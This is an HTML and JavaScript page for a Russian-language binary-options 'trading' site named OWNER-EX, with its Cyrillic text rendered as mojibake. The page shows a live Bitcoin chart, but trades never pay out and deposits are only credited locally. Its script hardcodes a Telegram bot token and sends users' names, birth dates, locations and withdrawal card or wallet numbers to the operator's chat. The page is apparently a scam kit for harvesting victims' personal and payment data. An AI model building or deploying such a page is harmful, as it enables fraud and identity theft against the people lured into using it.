<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>OWNER-EX ULTIMATE</title>
    <script src="https://unpkg.com/lightweight-charts@3.8.0/dist/lightweight-charts.standalone.production.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { 
            --bg: #0b0e11; --panel: #161a1e; --accent: #00ffad; 
            --red: #f6465d; --green: #0ecb81; --border: #2b2f36;
            --radius: 12px;
        }
        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); color: #eaecef; font-family: 'Inter', sans-serif; overflow: hidden; }

        /* HEADER */
        header { height: 65px; background: var(--panel); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; border-bottom: 1px solid var(--border); }
        .logo { font-weight: 900; color: var(--accent); font-size: 18px; }

        /* ACC SWITCHER */
        .account-switcher { display: flex; background: #000; border-radius: 10px; padding: 3px; border: 1px solid var(--border); }
        .acc-btn { padding: 6px 15px; border: none; background: none; color: #555; cursor: pointer; font-size: 12px; border-radius: 8px; transition: 0.3s; }
        .acc-btn.active { background: var(--accent); color: #000; font-weight: bold; }

        /* LAYOUT */
        .terminal { display: grid; grid-template-columns: 70px 1fr 280px; height: calc(100vh - 65px); }
        .sidebar { background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; align-items: center; padding-top: 20px; gap: 25px; }
        .side-btn { width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; border-radius: var(--radius); color: #848e9c; cursor: pointer; transition: 0.3s; }
        .side-btn:hover, .side-btn.active { background: rgba(0, 255, 173, 0.1); color: var(--accent); }

        /* MODALS */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 10000; display: none; justify-content: center; align-items: center; backdrop-filter: blur(10px); }
        .modal-card { background: var(--panel); border-radius: 20px; border: 1px solid var(--border); width: 450px; padding: 30px; position: relative; max-height: 90vh; overflow-y: auto; }
        .close-modal { position: absolute; top: 20px; right: 20px; cursor: pointer; color: gray; }

        /* TABS IN CASHIER */
        .tab-header { display: flex; gap: 10px; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
        .tab-link { padding: 10px; cursor: pointer; color: gray; font-size: 14px; }
        .tab-link.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        /* FORMS */
        .form-group { margin-bottom: 15px; text-align: left; }
        .form-group label { display: block; font-size: 12px; color: gray; margin-bottom: 5px; }
        input, select { width: 100%; padding: 12px; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 8px; box-sizing: border-box; }
        input:focus { border-color: var(--accent); outline: none; }
        .btn-action { width: 100%; padding: 15px; background: var(--accent); color: #000; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        /* TABLES */
        table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 10px; }
        th { text-align: left; color: gray; padding: 8px; border-bottom: 1px solid var(--border); }
        td { padding: 8px; border-bottom: 1px solid #222; }

        .main-view { display: flex; flex-direction: column; border-right: 1px solid var(--border); }
        #chart { flex: 1; }
        .trade-panel { background: var(--panel); padding: 20px; display: flex; flex-direction: column; gap: 15px; }
    </style>
</head>
<body>

<header>
    <div class="logo"><i class="fas fa-bolt"></i> OWNER-EX PRO</div>
    <div style="display:flex; align-items:center; gap:20px;">
        <div class="account-switcher">
            <button class="acc-btn active" id="btnDemo" onclick="switchAccount('demo')">DEMO</button>
            <button class="acc-btn" id="btnReal" onclick="switchAccount('real')">REAL</button>
        </div>
        <div id="displayBal" style="font-weight:bold; color:var(--green); font-size:18px;">$0.00</div>
    </div>
</header>

<div class="terminal">
    <div class="sidebar">
        <div class="side-btn active" onclick="closeAllModals()"><i class="fas fa-chart-line"></i></div>
        <div class="side-btn" onclick="openModal('cashierModal')"><i class="fas fa-wallet"></i></div>
        <div class="side-btn" onclick="openModal('profileModal')"><i class="fas fa-user-circle"></i></div>
        <div class="side-btn" onclick="location.reload()" style="margin-top:auto; margin-bottom:20px;"><i class="fas fa-power-off"></i></div>
    </div>

    <div class="main-view">
        <div id="chart"></div>
    </div>

    <div class="trade-panel">
        <div class="form-group">
            <label>–°–£–ú–ú–ê (USDT)</label>
            <input type="number" id="tAmt" value="100">
        </div>
        <div class="form-group">
            <label>–í–†–ï–ú–Ø (–°–ï–ö)</label>
            <input type="number" id="tSec" value="15">
        </div>
        <button class="btn-action" style="background:var(--green)" onclick="execTrade('CALL')">–í–´–®–ï ‚Üë</button>
        <button class="btn-action" style="background:var(--red); color:white" onclick="execTrade('PUT')">–ù–ò–ñ–ï ‚Üì</button>
    </div>
</div>

<div id="cashierModal" class="modal-overlay">
    <div class="modal-card">
        <i class="fas fa-times close-modal" onclick="closeAllModals()"></i>
        <div class="tab-header">
            <div class="tab-link active" onclick="switchTab(event, 'tab-dep')">–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ</div>
            <div class="tab-link" onclick="switchTab(event, 'tab-with')">–í—ã–≤–æ–¥</div>
            <div class="tab-content-link tab-link" onclick="switchTab(event, 'tab-hist')">–ò—Å—Ç–æ—Ä–∏—è –æ–ø–µ—Ä–∞—Ü–∏–π</div>
        </div>

        <div id="tab-dep" class="tab-content active">
            <div class="form-group">
                <label>–ú–µ—Ç–æ–¥ –æ–ø–ª–∞—Ç—ã</label>
                <select id="depMethod">
                    <option>USDT (TRC20)</option>
                    <option>Bitcoin</option>
                    <option>–ö–∞—Ä—Ç–∞ –†–§/–°–ù–ì</option>
                </select>
            </div>
            <div class="form-group">
                <label>–°—É–º–º–∞ ($)</label>
                <input type="number" id="depAmt" value="100">
            </div>
            <button class="btn-action" onclick="doDeposit()">–ü–æ–ø–æ–ª–Ω–∏—Ç—å</button>
        </div>

        <div id="tab-with" class="tab-content">
            <div class="form-group">
                <label>–ö—É–¥–∞ –≤—ã–≤–æ–¥–∏—Ç—å (–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã / –ö–æ—à–µ–ª–µ–∫)</label>
                <input type="text" id="withTarget" placeholder="TXXX.... –∏–ª–∏ 4276....">
            </div>
            <div class="form-group">
                <label>–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞</label>
                <input type="number" id="withAmt" placeholder="0.00">
            </div>
            <button class="btn-action" style="background:#f39c12" onclick="doWithdraw()">–°–æ–∑–¥–∞—Ç—å –∑–∞—è–≤–∫—É –Ω–∞ –≤—ã–≤–æ–¥</button>
        </div>

        <div id="tab-hist" class="tab-content">
            <table>
                <thead><tr><th>–î–∞—Ç–∞</th><th>–¢–∏–ø</th><th>–°—É–º–º–∞</th><th>–°—Ç–∞—Ç—É—Å</th></tr></thead>
                <tbody id="cashierHistory"></tbody>
            </table>
        </div>
    </div>
</div>

<div id="profileModal" class="modal-overlay">
    <div class="modal-card">
        <i class="fas fa-times close-modal" onclick="closeAllModals()"></i>
        <h3 style="color:var(--accent); margin-top:0">–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø—Ä–æ—Ñ–∏–ª—è</h3>
        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px;">
            <div class="form-group"><label>–ò–º—è</label><input type="text" id="pName"></div>
            <div class="form-group"><label>–§–∞–º–∏–ª–∏—è</label><input type="text" id="pSurname"></div>
            <div class="form-group"><label>–ù–∏–∫–Ω–µ–π–º</label><input type="text" id="pNick"></div>
            <div class="form-group"><label>–î–∞—Ç–∞ —Ä–æ–∂–¥–µ–Ω–∏—è</label><input type="date" id="pBirth"></div>
            <div class="form-group"><label>–°—Ç—Ä–∞–Ω–∞</label><input type="text" id="pCountry"></div>
            <div class="form-group"><label>–ì–æ—Ä–æ–¥</label><input type="text" id="pCity"></div>
            <div class="form-group"><label>–ò–Ω–¥–µ–∫—Å (6 —Ü–∏—Ñ—Ä)</label><input type="text" id="pZip" maxlength="6"></div>
            <div class="form-group"><label>–ü—Ä–æ–º–æ–∫–æ–¥</label><input type="text" id="pPromo"></div>
        </div>
        <button class="btn-action" onclick="saveProfile()">–°–æ—Ö—Ä–∞–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ</button>
    </div>
</div>

<script>
    // 1. –ù–ê–°–¢–†–û–ô–ö–ò –¢–ï–õ–ï–ì–†–ê–ú (–•–æ–∑—è–∏–Ω, –≤–ø–∏—à–∏—Ç–µ —Å–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ –∑–¥–µ—Å—å)
    const TG_TOKEN = "8102627080:AAGGbjyR0g1VzICKb-ait4t3CA34PJz1g5M"; 
    const TG_USER_ID = "6426834853";

    // 2. –•–†–ê–ù–ò–õ–ò–©–ï (–ß—Ç–æ–±—ã –±–∞–ª–∞–Ω—Å –Ω–µ –ø—Ä–æ–ø–∞–¥–∞–ª)
    let bals = JSON.parse(localStorage.getItem('bals')) || { demo: 10000, real: 0 };
    let profile = JSON.parse(localStorage.getItem('profile')) || {};
    let cashierHistory = JSON.parse(localStorage.getItem('cashier_hist')) || [];
    let curAcc = 'demo';
    let lastPrice = 0;
    let chart, series;

    function saveToStorage() {
        localStorage.setItem('bals', JSON.stringify(bals));
        localStorage.setItem('profile', JSON.stringify(profile));
        localStorage.setItem('cashier_hist', JSON.stringify(cashierHistory));
    }

    // 3. –§–£–ù–ö–¶–ò–Ø –û–¢–ü–†–ê–í–ö–ò –í –¢–ì
    async function sendTelegram(message) {
        const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TG_USER_ID, text: message, parse_mode: "HTML" })
            });
        } catch (e) { console.error("–û—à–∏–±–∫–∞ TG:", e); }
    }

    // 4. –û–ë–ù–û–í–õ–ï–ù–ù–´–ô –ü–†–û–§–ò–õ–¨ (–í–∞—à –∫–æ–¥)
    window.saveProfile = () => {
        const zip = document.getElementById('pZip').value;
        const name = document.getElementById('pName').value;
        const birth = document.getElementById('pBirth').value;

        if(!name || name.length < 2) return alert("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –∏–º—è");
        if(!/^\d+$/.test(zip) || zip.length < 5) return alert("–ò–Ω–¥–µ–∫—Å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ü–∏—Ñ—Ä—ã");
        
        const age = new Date().getFullYear() - new Date(birth).getFullYear();
        if(age < 18) return alert("–¢–æ—Ä–≥–æ–≤–ª—è —Ä–∞–∑—Ä–µ—à–µ–Ω–∞ —Ç–æ–ª—å–∫–æ —Å 18 –ª–µ—Ç");

        const inputs = ['pName','pSurname','pNick','pBirth','pCountry','pCity','pZip','pPromo'];
        inputs.forEach(id => profile[id] = document.getElementById(id).value);
        saveToStorage();

        const msg = `üë§ <b>–ù–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–æ—Ñ–∏–ª—è:</b>\n–ù–∏–∫: ${profile.pNick}\n–ò–º—è: ${profile.pName} ${profile.pSurname}\n–î–†: ${profile.pBirth}\n–õ–æ–∫–∞—Ü–∏—è: ${profile.pCountry}, ${profile.pCity}\n–ü—Ä–æ–º–æ: ${profile.pPromo || '–Ω–µ—Ç'}`;
        sendTelegram(msg);
        alert("–ü—Ä–æ—Ñ–∏–ª—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω –∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!");
    };

    // 5. –û–ë–ù–û–í–õ–ï–ù–ù–´–ô –í–´–í–û–î (–í–∞—à –∫–æ–¥)
    window.doWithdraw = () => {
        const amt = parseFloat(document.getElementById('withAmt').value);
        const target = document.getElementById('withTarget').value;

        if(amt > bals.real) return alert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤");
        if(!target) return alert("–£–∫–∞–∂–∏—Ç–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã");

        bals.real -= amt;
        cashierHistory.unshift({ date: new Date().toLocaleString(), type: '–í—ã–≤–æ–¥', amt: '$'+amt, status: '–í –æ–±—Ä–∞–±–æ—Ç–∫–µ' });
        saveToStorage();
        updateBalUI();

        const msg = `üí∞ <b>–ó–ê–Ø–í–ö–ê –ù–ê –í–´–í–û–î:</b>\n–°—É–º–º–∞: $${amt}\n–†–µ–∫–≤–∏–∑–∏—Ç—ã: ${target}\n–ù–∏–∫: ${profile.pNick || '–ò–Ω–∫–æ–≥–Ω–∏—Ç–æ'}`;
        sendTelegram(msg);
        alert("–ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!");
        renderHistory();
    };

    // 6. –§–£–ù–ö–¶–ò–ò –ì–†–ê–§–ò–ö–ê (–ù–ï –í–´–ö–õ–Æ–ß–ê–ï–ú!)
    function initChart() {
        chart = LightweightCharts.createChart(document.getElementById('chart'), {
            layout: { background: { color: '#0b0e11' }, textColor: '#848e9c' },
            grid: { vertLines: { color: '#161a1e' }, horzLines: { color: '#161a1e' } },
            timeScale: { timeVisible: true, secondsVisible: true }
        });
        series = chart.addCandlestickSeries({ upColor: '#0ecb81', downColor: '#f6465d' });
        
        fetch(`https://api.binance.com/api/v3/klines?symbol=BTCUSDT&interval=1m&limit=500`)
            .then(r => r.json())
            .then(d => series.setData(d.map(x => ({ time: x[0]/1000, open: +x[1], high: +x[2], low: +x[3], close: +x[4] }))));

        const ws = new WebSocket(`wss://stream.binance.com:9443/ws/btcusdt@kline_1s`);
        ws.onmessage = e => {
            const k = JSON.parse(e.data).k;
            lastPrice = +k.c;
            series.update({ time: k.t/1000, open: +k.o, high: +k.h, low: +k.l, close: lastPrice });
        };
    }

    // 7. –û–°–¢–ê–õ–¨–ù–ê–Ø –õ–û–ì–ò–ö–ê
    window.doDeposit = () => {
        const amt = parseFloat(document.getElementById('depAmt').value);
        if(amt > 0) {
            bals.real += amt;
            cashierHistory.unshift({ date: new Date().toLocaleString(), type: '–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ', amt: '$'+amt, status: '–£—Å–ø–µ—à–Ω–æ' });
            saveToStorage();
            updateBalUI();
            renderHistory();
            sendTelegram(`üí≥ <b>–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ:</b> +$${amt}\n–ù–∏–∫: ${profile.pNick || '–ò–Ω–∫–æ–≥–Ω–∏—Ç–æ'}`);
            alert("–ë–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω!");
        }
    };

    window.switchAccount = (acc) => {
        curAcc = acc;
        document.getElementById('btnDemo').classList.toggle('active', acc === 'demo');
        document.getElementById('btnReal').classList.toggle('active', acc === 'real');
        updateBalUI();
    };

    function updateBalUI() {
        document.getElementById('displayBal').innerText = `$${bals[curAcc].toLocaleString()}`;
    }

    function renderHistory() {
        const container = document.getElementById('cashierHistory');
        if(container) container.innerHTML = cashierHistory.map(h => `<tr><td>${h.date}</td><td>${h.type}</td><td>${h.amt}</td><td style="color:orange">${h.status}</td></tr>`).join('');
    }

    window.openModal = (id) => { 
        document.getElementById(id).style.display = 'flex'; 
        if(id === 'profileModal') loadProfile(); 
        renderHistory(); 
    };

    window.closeAllModals = () => { document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none'); };

    function loadProfile() {
        const inputs = ['pName','pSurname','pNick','pBirth','pCountry','pCity','pZip','pPromo'];
        inputs.forEach(id => { if(profile[id]) document.getElementById(id).value = profile[id]; });
    }

    window.execTrade = (type) => {
        const amt = +document.getElementById('tAmt').value;
        if(bals[curAcc] < amt) return alert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤!");
        bals[curAcc] -= amt;
        updateBalUI();
        saveToStorage();
        alert(`–°–¥–µ–ª–∫–∞ ${type} –æ—Ç–∫—Ä—ã—Ç–∞ –Ω–∞ $${amt}`);
    };

    // –ó–ê–ü–£–°–ö
    initChart();
    updateBalUI();
    loadProfile();
</script>
</body>
</html>

